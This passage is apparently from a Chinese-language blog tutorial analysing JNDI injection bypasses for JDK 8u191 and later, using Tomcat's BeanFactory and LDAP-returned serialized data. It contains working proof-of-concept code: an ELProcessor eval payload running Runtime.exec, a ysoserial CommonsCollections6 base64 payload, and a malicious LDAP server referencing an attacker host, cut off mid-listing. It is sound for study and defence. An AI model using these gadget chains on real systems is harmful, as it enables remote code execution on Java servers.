<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment, Attributes attrs)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">                <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                    factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                    <span class="keyword">if</span> (factory <span class="keyword">instanceof</span> DirObjectFactory) &#123;</span><br><span class="line">                        <span class="keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(</span><br><span class="line">                            ref, name, nameCtx, environment, attrs);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                         environment);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">                &#125; ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里就和rmi一样了，首先进行本地类加载，若在本地没有找到，则从codebase中查找，若找到则进行类加载，最后进行类的初始化，触发构造函数，弹出计算机</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="nNAiJ">JDK高版本绕过</h2>
<h3 id="WRK3l">JDK8u191之后</h3>
<h4 id="RW8TM">本地恶意CLass绕过</h4>

<p>在jdk8u191后，LDAP已经修复，在进行codebase远程类加载时候，添加了一个限制条件</p>
<p>如果<code>trustURLCodebase</code>为true时，才能进行远程类加载</p>
<p>更换高版本后，原来的给攻击既不弹计算器，也不会报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736748651382-30f900c0-794e-4719-885b-944e33751a82.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736748651382-30f900c0-794e-4719-885b-944e33751a82.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>···</p>
<p>既然他不能远程加载对象了，那我们可以想想，是否有本地工厂，可以利用呢？</p>
<p>该恶意<code>Factory</code>必须实现<code>javax.naming.spi.ObjectFactory</code>接口，并实现<code>getObjectInstance()</code>方法</p>
<p>在tomcat的核心包中，存在着一个<code>BeanFactory</code>，它的<code>getObjectInstance</code>方法存在着反射调用的地方，如果说我们这里参数可控，则可以造成代码执行，因此我们这个高版本绕过，是基于<strong>tomcat环境</strong>的（方法很长，大部分省略）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                .......</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                method.invoke(bean, valueArray);</span><br><span class="line">                            &#125; </span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="mfgHp">实现</h5>
我在这里起一个RMI环境

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">r</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后起将一个<code>ResourceRef</code>绑定到remoteObj上面，使用客户端的<code>lookup</code>方法进行查询，即可执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIByPass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        InitialContext initialContext= <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ElProcessor&quot;</span>,<span class="literal">null</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>,<span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,<span class="string">&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>));</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>,ref);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741399917776-e14d0309-fcfd-4f4e-8bfb-dcda444ba8dc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741399917776-e14d0309-fcfd-4f4e-8bfb-dcda444ba8dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="yvE8v">分析</h5>

<p>与前面的调用相类似，经过一些<code>lookup</code>方法的调用，和<code>decodeObject</code>方法过后，走到<code>NamingManager#getObjectInstance</code>中，执行<code>getObjectFactoryFromReference</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">        <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                          Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                     environment);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">                <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">                <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在这个方法中，首先会在本地进行类加载，与之前的不同，这次可以在本地找到<code>BeanFactory</code>,即可在本地进行加载，最后return时候进行实例化，我们即可获得一个<code>BeanFactory</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> ObjectFactory <span class="title function_">getObjectFactoryFromReference</span><span class="params">(</span></span><br><span class="line"><span class="params">        Reference ref, String factoryName)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">        InstantiationException,</span><br><span class="line">        MalformedURLException &#123;</span><br><span class="line">        Class&lt;?&gt; clas = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Try to use current class loader</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">             clas = helper.loadClass(factoryName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// ignore and continue</span></span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">        String codebase;</span><br><span class="line">        <span class="keyword">if</span> (clas == <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                (codebase = ref.getFactoryClassLocation()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (clas != <span class="literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736826588859-3fe4acb2-756a-462d-8500-b8354c440584.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1736826588859-3fe4acb2-756a-462d-8500-b8354c440584.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>返回后，接下来我们要走到<code>factory.getObjectInstance(ref, name, nameCtx,environment)</code>中，也就是<code>BeanFactory#getObjectInstance</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ResourceRef) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference)obj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">                Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var26) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        beanClass = Class.forName(beanClassName);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var25) &#123;</span><br><span class="line">                        <span class="type">ClassNotFoundException</span> <span class="variable">e</span> <span class="operator">=</span> var25;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (beanClass == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Class not found: &quot;</span> + beanClassName);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">                    PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line">                    <span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">                    Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                    String value;</span><br><span class="line">                    String propName;</span><br><span class="line">                    <span class="type">int</span> i;</span><br><span class="line">                    <span class="keyword">if</span> (ra != <span class="literal">null</span>) &#123;</span><br><span class="line">                        value = (String)ra.getContent();</span><br><span class="line">                        Class&lt;?&gt;[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;;</span><br><span class="line">                        String[] arr$ = value.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                        i = arr$.length;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; i; ++i$) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">                            param = param.trim();</span><br><span class="line">                            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> param.indexOf(<span class="number">61</span>);</span><br><span class="line">                            <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                propName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">                                param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                propName = <span class="string">&quot;set&quot;</span> + param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) + param.substring(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                forced.put(param, beanClass.getMethod(propName, paramTypes));</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (SecurityException | NoSuchMethodException var24) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + propName + <span class="string">&quot; not found for property &quot;</span> + param);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                <span class="keyword">do</span> &#123;</span><br><span class="line">                                    <span class="keyword">do</span> &#123;</span><br><span class="line">                                        <span class="keyword">do</span> &#123;</span><br><span class="line">                                            <span class="keyword">do</span> &#123;</span><br><span class="line">                                                <span class="keyword">if</span> (!e.hasMoreElements()) &#123;</span><br><span class="line">                                                    <span class="keyword">return</span> bean;</span><br><span class="line">                                                &#125;</span><br><span class="line"></span><br><span class="line">                                                ra = (RefAddr)e.nextElement();</span><br><span class="line">                                                propName = ra.getType();</span><br><span class="line">                                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;factory&quot;</span>));</span><br><span class="line">                                        &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;scope&quot;</span>));</span><br><span class="line">                                    &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;auth&quot;</span>));</span><br><span class="line">                                &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;forceString&quot;</span>));</span><br><span class="line">                            &#125; <span class="keyword">while</span>(propName.equals(<span class="string">&quot;singleton&quot;</span>));</span><br><span class="line"></span><br><span class="line">                            value = (String)ra.getContent();</span><br><span class="line">                            Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method)forced.get(propName);</span><br><span class="line">                            <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = value;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    method.invoke(bean, valueArray);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Forced String setter &quot;</span> + method.getName() + <span class="string">&quot; threw exception for property &quot;</span> + propName);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ra是从引用里获取<code>forceString</code>，我们这里传入的值为<code>x=eval</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400707689-1853e352-e2ba-43ec-8a29-f4de959e0ffe.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400707689-1853e352-e2ba-43ec-8a29-f4de959e0ffe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里会检查，是否存在<code>=</code>(等于号的ascii为61)，不存在就会调用默认属性的setter方法，存在就会取其键值，键为属性名，而值是其指定的setter方法</p>
<p>这里这段代码，把x的setter强行指定为<code>eval</code>方法，这就是我们的关键利用点，之后就会获取<code>beanClass</code>即</p>
<p><code>javax.el.ELProcessor</code>的<code>eval</code>方法并同<code>x</code>属性一同放入<code>forced</code>这个<code>HashMap</code>中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400791897-fa0822d8-b00b-4e89-aef7-d501e0f06d0c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741400791897-fa0822d8-b00b-4e89-aef7-d501e0f06d0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接着是多个 do while 语句来遍历获取 <code>ResourceRef</code> 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用<code>getContent()</code>方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 <code>ResourceRef</code> 类实例添加的第二个元素</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401357575-539ecba6-7ce2-41a2-9ff2-5e8c2f423490.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401357575-539ecba6-7ce2-41a2-9ff2-5e8c2f423490.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即<code>javax.el.ELProcessor</code>类的<code>eval()</code>方法并赋值给method变量，最后就是通过<code>method.invoke()</code>即反射调用的来执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401466693-3ec57d1b-642c-460d-8d14-274dc995b47f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741401466693-3ec57d1b-642c-460d-8d14-274dc995b47f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="n52C0">LDAP返回序列化数据，触发本地Target</h4>

<p>LDAP除了支持JNDI Reference这种利用方法，还支持直接返回一个序列化的对象，若Java对象的javaSerializedData属性不为空，则客户端的<code>obj.decodeObject()</code>方法就会最这个字段的内容进行反序列化</p>
<p>若服务端的ClassPath中存在反序列化利用点的Gadget，例如CC依赖等等，就可以实现LDAP结合该Garget实现反序列化漏洞攻击</p>
<p>我们这里使用CC6来实现攻击</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master.jar CommonsCollections6 <span class="string">&#x27;calc&#x27;</span> | base64</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=</span><br></pre></td></tr></table></figure>

<p>恶意LDAP服务器如下（服务端和客户端都要导入CC依赖）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIGadgetServer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://vps:8000/#ExportObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> 